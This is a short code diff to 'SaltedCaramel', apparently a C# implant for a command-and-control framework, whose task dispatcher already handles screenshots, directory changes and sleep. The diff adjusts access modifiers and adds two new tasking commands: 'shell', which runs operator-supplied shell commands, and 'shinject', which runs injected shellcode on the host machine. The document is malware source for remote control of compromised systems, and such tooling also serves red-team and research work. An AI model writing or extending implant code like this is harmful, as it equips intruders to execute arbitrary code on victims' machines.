@@ -9,9 +9,9 @@ namespace SaltedCaramel
     /// </summary>
     internal class SCTask
     {
-        internal string command { get; set; }
-        internal string @params { get; set; }
-        internal string id { get; set; }
+        public string command { get; set; }
+        public string @params { get; set; }
+        public string id { get; set; }
 
         public SCTask (string command, string @params, string id)
         {
@@ -24,7 +24,7 @@ namespace SaltedCaramel
         /// Handle a new task.
         /// </summary>
         /// <param name="implant">The CaramelImplant we're handling a task for</param>
-        public void DispatchTask(SCImplant implant)
+        internal void DispatchTask(SCImplant implant)
         {
             if (this.command == "cd")
             {
@@ -96,6 +96,16 @@ namespace SaltedCaramel
             {
                 Debug.WriteLine("[-] DispatchTask - Tasked to take screenshot.");
                 ScreenCapture.Execute(this, implant);
+            }
+            else if (this.command == "shell")
+            {
+                Debug.WriteLine("[-] DispatchTask - Tasked to run shell command.");
+                Proc.Execute(this, implant);
+            }
+            else if (this.command == "shinject")
+            {
+                Debug.WriteLine("[-] DispatchTask - Tasked to run shellcode.");
+                Shellcode.Execute(this, implant);
             }
             else if (this.command == "sleep")
             {
